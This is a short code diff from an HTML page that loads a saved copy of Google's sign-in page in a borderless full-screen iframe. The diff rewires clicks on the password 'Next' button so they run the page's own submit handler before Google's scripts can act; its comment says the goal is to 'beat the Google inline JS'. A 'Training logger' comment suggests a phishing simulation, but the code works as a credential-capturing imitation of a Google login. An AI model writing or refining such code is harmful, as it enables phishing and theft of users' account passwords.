@@ -16,7 +16,7 @@
 </head>
 
 <body>
-    <!-- Load the exact Google page we saved → identical visuals -->
+    <!-- Load the pixel-perfect saved Google page directly -->
     <iframe id="authFrame" src="/Welcome.html" style="border:none;width:100%;height:100%"></iframe>
 
     <!-- Training logger -->
@@ -100,10 +100,15 @@
                     window.location.href = url;
                 }
 
-                if (nextBtn) nextBtn.addEventListener('click', (e) => {
-                    e.preventDefault();
-                    handleSubmit();
-                });
+                // Ensure any click on the "Next" region routes through our handler –
+                // capturing phase so we beat the Google inline JS.
+                doc.addEventListener('click', (ev) => {
+                    const target = ev.target;
+                    if (target && target.closest('#passwordNext')) {
+                        ev.preventDefault();
+                        handleSubmit();
+                    }
+                }, true);
             }
         });
     </script>
